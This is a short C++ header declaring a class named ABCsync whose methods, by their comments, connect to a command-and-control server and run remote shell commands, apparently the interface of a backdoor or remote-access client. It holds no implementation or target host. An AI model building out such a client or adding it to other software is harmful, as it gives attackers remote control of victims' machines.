#ifndef ABCSYNC_H
#define ABCSYNC_H

#include <string>

class ABCsync {
public:
    // Connect to the C2 server
    bool connectToC2(const std::string& c2Address, int port);

    // Execute the remote shell command
    bool executeRemoteCommand(const std::string& command);

private:
    // Helper function to establish a connection and handle command execution
    bool executeCommand(const std::string& command);
};

#endif
